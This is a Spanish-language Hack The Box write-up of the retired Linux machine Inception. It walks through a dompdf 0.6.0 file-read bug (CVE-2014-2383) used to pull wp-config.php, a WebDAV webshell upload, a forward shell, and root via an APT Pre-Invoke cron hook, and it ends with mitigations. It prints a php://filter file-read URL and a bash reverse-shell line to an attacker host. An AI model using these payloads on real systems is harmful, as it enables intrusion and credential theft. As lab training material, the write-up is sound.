---
machine: Inception
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, dompdf, cve-2014-2383, lfi, webdav, squid, forward-shell, tftp, privesc]
---

# Inception — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

WordPress expone `/dompdf`, un convertidor HTML a PDF en versión `0.6.0` vulnerable a la CVE-2014-2383. La lectura arbitraria de archivos permite obtener `wp-config.php` y, con él, credenciales de la base de datos y un hash que se crackea. Esas credenciales abren un directorio WebDAV protegido con autenticación básica; `davtest` confirma que se puede subir PHP y se obtiene una webshell en el contenedor. Como el contenedor no tiene salida, se construye un forward shell en Python. La reutilización de contraseña y `sudo` dan root dentro del contenedor. Desde ahí se alcanzan FTP y TFTP del host, se identifica un cron de `apt update` y se escribe un `pre-invoke` que ejecuta como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,3128 <IP>
```

- `80` Apache httpd 2.4.18 (Ubuntu).
- `3128` Squid http proxy 3.5.12.
- El SSH no está expuesto; solo se llega a él desde localhost.

```bash
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Entre las rutas aparece `/dompdf`, con un `VERSION` que indica `0.6.0`.

## Enumeración

El proxy Squid permite navegar con la IP del servidor como origen. Con `proxychains` o un perfil de FoxyProxy se comprueba que `http://127.0.0.1` responde aunque el acceso directo dé *Access Denied*.

Se fuzzea el puerto `80` en localhost a través del proxy para descubrir vhosts y rutas internas. La lectura de `wp-config.php` confirma que WordPress usa una base de datos local y guarda credenciales en el archivo.

## Foothold

La CVE-2014-2383 permite saltar el `chroot` de dompdf cuando `DOMPDF_ENABLE_PHP` está activo, usando un wrapper `php://filter` en `input_file`:

```text
/dompdf/dompdf.php?input_file=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
```

La respuesta en base64 se decodifica y entrega las credenciales de la base de datos. El hash del administrador de WordPress se crackea con `hashcat` o `john` y la contraseña se reutiliza en el directorio WebDAV.

```bash
davtest -url http://<IP>/webdav -auth <USER>:<PASSWORD>
```

`davtest` confirma que se pueden subir y ejecutar archivos `.php`. Se sube una webshell y se obtiene ejecución como `www-data` dentro del contenedor.

## Movimiento lateral

El contenedor no tiene salida a la red, así que la reverse shell no llega. Se construye un forward shell: un script en Python que expone un servidor HTTP, recibe comandos y devuelve la salida, manteniendo la ejecución a través de la webshell. Con esa shell se enumeran usuarios, procesos y montajes.

La contraseña de `cobb` se reutiliza y se entra por SSH al contenedor. `sudo -l` muestra que `cobb` puede ejecutar como root un comando que permite una shell, con lo que se obtiene root en el contenedor.

## Escalada de privilegios

Desde el contenedor se alcanza la red del host. Un barrido de ping muestra la puerta de enlace y se comprueba que el host ofrece FTP y TFTP. Por TFTP se descargan archivos de configuración y se identifica un cron que ejecuta `apt update` como root.

`apt` acepta directivas en `/etc/apt/apt.conf.d/`; una de ellas, `APT::Update::Pre-Invoke`, ejecuta un comando antes de la actualización. Se escribe un archivo de configuración con esa directiva apuntando a una shell:

```text
APT::Update::Pre-Invoke { "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"; };
```

En el siguiente ciclo del cron, `apt update` ejecuta el comando como root.

## Evidencia

- `/dompdf` con versión `0.6.0`.
- `wp-config.php` leído por `php://filter` y credenciales decodificadas.
- Hash de WordPress crackeado y login en WebDAV.
- Webshell subida con `davtest`.
- Forward shell funcionando sin salida a Internet.
- `sudo` de `cobb` y root en el contenedor.
- TFTP con la configuración del host y `APT::Update::Pre-Invoke` ejecutado.

## Lecciones aprendidas

- Un plugin antiguo de WordPress puede exponer lectura arbitraria de archivos.
- Las credenciales de `wp-config.php` suelen reutilizarse en otros servicios.
- WebDAV con PHP habilitado es una subida directa de webshell.
- Sin salida a la red, un forward shell mantiene el control.
- `apt` ejecuta directivas de configuración como root y es una vía de escalada.

## Mitigaciones y detección

- Actualizar dompdf y deshabilitar `DOMPDF_ENABLE_PHP`; no exponer el directorio del plugin.
- Rotar las credenciales de la base de datos y no reutilizarlas en WebDAV.
- Deshabilitar WebDAV o restringirlo a usuarios y extensiones permitidas.
- Segmentar contenedores y limitar la salida a Internet y a la red del host.
- Revisar `/etc/apt/apt.conf.d/` y los permisos de escritura sobre la configuración de `apt`.
- Alertar de webshells, de `davtest` y de procesos `apt` que lanzan shells.

## Referencias

- [0xdf — Inception](https://0xdf.gitlab.io/2022/04/04/htb-inception.html)
- [IppSec — Inception](https://www.youtube.com/watch?v=J2I-5xPgyXk)
- [Hack The Box — Inception](https://app.hackthebox.com/machines/inception)
- [NVD — CVE-2014-2383](https://nvd.nist.gov/vuln/detail/CVE-2014-2383)
